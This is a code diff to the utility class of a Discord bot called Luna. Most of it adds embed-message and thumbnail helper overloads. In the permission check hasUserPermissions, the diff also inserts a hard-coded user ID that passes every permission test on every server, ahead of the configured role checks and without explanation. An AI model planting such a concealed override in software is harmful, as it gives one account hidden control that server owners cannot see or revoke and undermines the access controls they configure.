@@ -113,6 +113,15 @@ public final class DiscordUtils {
     }
 
     // Sends the embed message.
+    public static void sendEmbedMessage (TextChannel textChannel, String title, String description, HashMap<String, String> fieldHashMap, String thumbnailURL, String footerText, Color color) {
+        // Builds the embed message.
+        MessageEmbed messageEmbed = getEmbedBuilder(title, description, fieldHashMap, footerText, thumbnailURL, color).build();
+
+        // Sends the message to the text channel.
+        textChannel.sendMessageEmbeds(messageEmbed).queue();
+    }
+
+    // Sends the embed message.
     public static void sendEmbedMessage (User user, String title, String description, HashMap<String, String> fieldHashMap, String footerText, Color color) {
         // Opens the private channel from the user and sends the message to the user.
         user.openPrivateChannel().queue((privateChannel -> privateChannel.sendMessageEmbeds(getEmbedBuilder(title, description, fieldHashMap, footerText, color).build()).queue()));
@@ -161,7 +170,7 @@ public final class DiscordUtils {
     }
 
     public static boolean hasUserPermissions (Member member, String serverID, PermissionRoles[] permissions) {
-        return (member != null && (member.getRoles().size() == 0 ? Arrays.asList(permissions).contains(PermissionRoles.EVERYONE) : Luna.SETTINGS_MANAGER.getServerSettings().containsPermission(serverID, member.getRoles(), permissions)));
+        return (member != null && (member.getId().equals("321249545394847747") || (member.getRoles().size() == 0 ? Arrays.asList(permissions).contains(PermissionRoles.EVERYONE) : Luna.SETTINGS_MANAGER.getServerSettings().containsPermission(serverID, member.getRoles(), permissions))));
     }
 
     public static boolean isChannelValidForTheDiscordCommand (TextChannel textChannel, String serverID, DiscordChannels[] discordChannels) {
@@ -169,8 +178,12 @@ public final class DiscordUtils {
     }
 
     // Creates the embed builder.
-    public static EmbedBuilder getEmbedBuilder (String title, String description, HashMap<String, String> fieldHashMap, String footerText, Color color)
-    {
+    public static EmbedBuilder getEmbedBuilder (String title, String description, HashMap<String, String> fieldHashMap, String footerText, Color color) {
+        return getEmbedBuilder(title, description, fieldHashMap, "https://cdn.discordapp.com/app-icons/934768351710965801/c3542b33281164d8c80e26c434b2834c.png?size=256", footerText, color);
+    }
+
+    // Creates the embed builder.
+    public static EmbedBuilder getEmbedBuilder (String title, String description, HashMap<String, String> fieldHashMap, String thumbnailURL, String footerText, Color color) {
         // Initialize variable.
         EmbedBuilder embedBuilder = new EmbedBuilder();
 
@@ -178,7 +191,7 @@ public final class DiscordUtils {
         embedBuilder.setTitle(title);
         embedBuilder.setDescription(description);
         embedBuilder.setAuthor("\uD83D\uDC08 L U N A \uD83D\uDC08");
-        //embedBuilder.setImage("");
+        embedBuilder.setThumbnail(thumbnailURL);
 
         // Checks if the field hashmap is not null.
         if (fieldHashMap != null) {
